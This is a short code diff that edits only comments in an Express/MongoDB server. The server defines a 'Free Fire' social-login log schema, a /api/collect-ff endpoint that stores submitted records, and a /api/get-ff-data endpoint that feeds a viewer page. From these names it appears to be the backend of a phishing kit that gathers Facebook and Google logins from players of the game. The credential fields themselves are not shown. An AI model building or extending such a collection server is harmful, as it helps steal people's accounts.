@@ -31,7 +31,7 @@ const LogSchema = new mongoose.Schema({
 });
 const LogModel = mongoose.model('Log', LogSchema);
 
-// 2. Free Fire (Facebook/Google/Apple) Log Schema
+// 2. Free Fire / Social Login (Facebook/Google) Log Schema
 const FFLogSchema = new mongoose.Schema({
     id: String,
     ip: String,
@@ -94,7 +94,7 @@ app.post('/api/collect', async (req, res) => {
     }
 });
 
-// Free Fire Data Collect (Facebook, Google, Apple)
+// Free Fire & Social Logins Data Collect (Facebook, Google)
 app.post('/api/collect-ff', async (req, res) => {
     try {
         const recordId = 'FF_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
@@ -132,7 +132,7 @@ app.get('/api/get-data', async (req, res) => {
     }
 });
 
-// Get Free Fire Data
+// Get Free Fire / Social Login Data for views.html / viewer.html
 app.get('/api/get-ff-data', async (req, res) => {
     try {
         const logs = await FFLogModel.find().sort({ timestamp: -1 });
